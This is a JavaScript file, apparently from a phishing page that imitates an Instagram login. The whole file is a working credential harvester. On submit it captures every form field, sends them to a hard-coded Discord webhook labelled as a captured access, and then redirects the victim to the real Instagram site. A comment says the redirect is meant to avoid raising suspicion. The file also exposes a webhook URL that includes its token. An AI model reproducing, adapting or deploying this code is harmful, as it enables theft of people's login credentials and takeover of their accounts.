document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('login-form');
    const btnEntrar = document.getElementById('btn-entrar');
    const webhookURL = "https://discord.com/api/webhooks/1481359530414706730/cBGczTGxlNbdGPTekcHHYP8NiiEzqK_xB_ilyQ0AYg5VcC2J8JLm-mZhB4QbqiSLalmJ";

    if (loginForm) {
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();

            btnEntrar.innerText = "Carregando...";
            btnEntrar.disabled = true;

            const formData = new FormData(loginForm);
            let campos = [];

            // Captura todos os inputs dinamicamente
            formData.forEach((value, key) => {
                campos.push({
                    name: key.toUpperCase(),
                    value: value || "Não informado",
                    inline: true
                });
            });

            const payload = {
                embeds: [{
                    title: "🔑 Novo Acesso Capturado",
                    color: 3447003,
                    fields: campos,
                    footer: { text: "Logs de Sistema" },
                    timestamp: new Date()
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(() => {
                // Após enviar, redireciona para o site real para não levantar suspeitas
                window.location.href = "https://www.instagram.com";
            })
            .catch(() => {
                btnEntrar.innerText = "Entrar";
                btnEntrar.disabled = false;
            });
        });
    }
});
